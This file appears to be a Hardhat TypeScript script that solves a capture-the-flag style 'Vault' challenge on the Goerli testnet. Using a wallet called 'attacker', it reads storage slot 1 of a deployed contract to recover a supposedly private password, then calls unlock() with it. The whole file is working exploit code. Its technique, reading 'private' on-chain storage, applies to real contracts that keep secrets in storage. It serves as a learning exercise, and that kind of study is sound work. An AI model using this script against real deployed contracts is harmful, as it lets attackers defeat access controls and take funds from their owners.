import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Vault"
const CONTRACT_ADDRESS = "0x4706679A01AbCB8032f133113130b5367AebfBab"

async function main() {
    const Vault = await ethers.getContractFactory(CONTRACT_NAME)
    const vault = Vault.attach(CONTRACT_ADDRESS)

    const password = await ethers.provider.getStorageAt(vault.address, 1)

    const tx: TransactionResponse = await vault.unlock(password)
    await tx.wait()

    console.log("Vault: unlock the vault");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });